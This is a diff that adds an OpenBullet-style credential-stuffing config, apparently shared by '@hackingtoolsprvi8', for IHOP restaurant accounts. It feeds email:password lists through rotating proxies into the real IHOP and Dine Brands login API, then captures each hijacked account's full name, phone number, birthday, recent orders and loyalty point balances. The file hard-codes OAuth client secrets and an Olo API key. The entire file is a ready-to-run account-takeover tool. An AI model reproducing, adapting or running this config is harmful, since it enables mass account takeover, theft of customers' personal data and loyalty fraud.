@@ -1,0 +1,140 @@
+[SETTINGS]
+{
+  "Name": "IHOP(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-23T12:03:26.4103724+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://www.dinefranchisees.com/oauth2/aus1l1nodzbys0uhX0h8/v1/token" 
+  CONTENT "grant_type=client_credentials&scope=read" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.dinefranchisees.com" 
+  HEADER "X-Dine-Channel: IOS" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-IR;q=1.0, fa-IR;q=0.9" 
+  HEADER "User-Agent: IHOP/4.2.0 (com.dineequity.ihop; build:2081; iOS 15.5.0) Alamofire/5.0.5" 
+  HEADER "Authorization: Basic MG9hMW1vNXg1b2xzQm9TSHgwaDg6aXVGV2JxYUw0SUJlSVRPa01JWkRmdWtfZ1BaT2RzM1RidllTSGlDeA==" 
+  HEADER "Connection: close" 
+
+#accessToken PARSE "<SOURCE>" JSON "access_token" -> VAR "accessToken" 
+
+#Login REQUEST POST "https://mule-api-lb-prod.dinebrands.com/api/authservices/v1.0/users/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: mule-api-lb-prod.dinebrands.com" 
+  HEADER "X-Dine-Channel: IOS" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-IR;q=1.0, fa-IR;q=0.9" 
+  HEADER "User-Agent: IHOP/4.2.0 (com.dineequity.ihop; build:2081; iOS 15.5.0) Alamofire/5.0.5" 
+  HEADER "Authorization: Bearer <accessToken>" 
+
+#Valid? KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" MatchesRegex "400|409" 
+  KEYCHAIN Success OR 
+    KEY "User have been Logged-in successfully" 
+
+#First PARSE "<SOURCE>" JSON "Details.firstName" JTokenParsing=TRUE -> VAR "First" 
+
+#Last PARSE "<SOURCE>" JSON "Details.lastName" JTokenParsing=TRUE -> VAR "Last" 
+
+#Full_Name FUNCTION Constant "<First> <Last>" -> CAP "Name" 
+
+#number PARSE "<SOURCE>" JSON "Details.contactNumber" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "number" 
+
+#birthDate PARSE "<SOURCE>" JSON "Details.customerBirthday" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "birthDate" 
+
+#accessToken2 PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken2" 
+
+#authenticationToken PARSE "<SOURCE>" REGEX "authenticationToken\": \"([a-zA-Z0-9]{1,})\"" "[1]" -> VAR "authenticationToken" 
+
+#Post REQUEST POST "https://www.dinefranchisees.com/oauth2/aus1l1nodzbys0uhX0h8/v1/token?grant_type=client_credentials&scope=read" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.dinefranchisees.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: IHOP/2081 CFNetwork/1333.0.4 Darwin/21.5.0" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Content-Length: 0" 
+  HEADER "Authorization: Basic MG9hMW10MnIzZ2VnWUZXOFcwaDg6V3BVcDA5ZU1zNE5Udm1vN3NSVmZMS0FkTkl2T1FYUTlSRHE5aEx5dg==" 
+  HEADER "Connection: close" 
+
+#accessToken3 PARSE "<SOURCE>" JSON "access_token" -> VAR "accessToken3" 
+
+#Get REQUEST GET "https://ordering.api.olo.com/v1.1/users/<authenticationToken>/recentorders" 
+  
+  HEADER "Host: ordering.api.olo.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: ihop/4.2.0/2081(iPhone;iOS;15.5;3.0)" 
+  HEADER "Authorization: OloKey BasGATFgkK02rtRpWpYiKVKtQIyX4Gud" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#key FUNCTION Constant "{\"orders\":[]}" -> VAR "key" 
+
+IF "<SOURCE>" EqualTo "<key>"
+SET CAP "orders" "notExist"
+ENDIF
+
+#Get REQUEST GET "https://mule-api-lb-prod.dinebrands.com/api/loyalty/v1.0/balance?accessToken=<accessToken2>" 
+  
+  HEADER "Host: mule-api-lb-prod.dinebrands.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: IHOP/2081 CFNetwork/1333.0.4 Darwin/21.5.0" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: Bearer <accessToken3>" 
+
+#pointsPending PARSE "<SOURCE>" JSON "Details.accountBalance.pointsPending" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "pointsPending" 
+
+#availablePoints PARSE "<SOURCE>" JSON "Details.accountBalance.availablePoints" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "availablePoints" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
